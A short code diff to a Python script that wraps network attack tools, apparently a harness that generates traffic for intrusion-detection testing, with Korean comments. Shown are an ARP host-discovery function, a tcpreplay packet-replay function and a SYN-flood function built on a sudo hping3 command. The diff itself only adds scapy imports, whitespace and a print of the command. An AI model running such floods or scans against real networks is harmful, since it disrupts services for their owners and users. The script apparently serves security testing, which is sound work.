@@ -5,6 +5,8 @@ import signal
 from time import sleep
 import os
 from attack_intensity import *
+from scapy.all import *
+from scapy.utils import rdpcap
 
 
 # ARP Scan을 사용 - 가장 빠르게 스캔이 가능하며, 포트 번호가 필요치 않음
@@ -25,11 +27,12 @@ def host_discovery(target_ip, intensity):
 
     log('End', attack_type='Host Discovery')
 
+
+
 def tcp_replay(pcap_file, loop=1):
     print('[TCP Replay]')
     log('Start', attack_type='TCP replay', param_info={'pcap_file': pcap_file, 'loop':loop})
 
-    
     attack_command=f'sudo tcpreplay -i eth0 -K --loop {loop} {pcap_file}'
     attack_command_list_form = attack_command.split(' ')
 
@@ -122,7 +125,7 @@ def syn_flood(dstIP, dstPort, pps, count):
     interval_us = round(10**6/pps)    # microseconds
     attack_command = f'sudo hping3 {dstIP} -i u{interval_us} -S -p {dstPort} -c {count} -q'  # + ' --rand-source'
     attack_command_list_form = attack_command.split(' ')
-
+    print(attack_command)
     log('Mid', attack_command)
     subprocess.call(attack_command_list_form)
 
